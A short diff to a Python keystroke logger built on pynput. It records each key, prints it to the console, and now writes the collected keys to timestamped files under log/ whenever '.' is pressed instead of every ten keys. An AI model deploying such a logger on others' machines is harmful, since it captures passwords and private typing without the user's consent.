@@ -3,7 +3,7 @@ import time
 import os
 from pynput.keyboard import Key, Listener
 
-count = 0
+
 keys = []
 
 
@@ -11,16 +11,14 @@ def on_press(key):
     global keys, count
 
     keys.append(key)
-    count += 1
     print("{0} pressed".format(key))
 
-    if count >= 10:
-        count = 0
+    if "{0}".format(key) == "'.'":
         writefile(keys)
         keys = []
 
 def writefile(keys):
-    timestr = time.strftime("%Y%m%d-%H%M%S") + ".txt"
+    timestr = time.strftime("%Y%m%d-%H%M-%S") + ".txt"
     os.makedirs(os.path.dirname("log/"), exist_ok=True)
     with open("log/"+timestr, "w") as f:
         for key in keys:
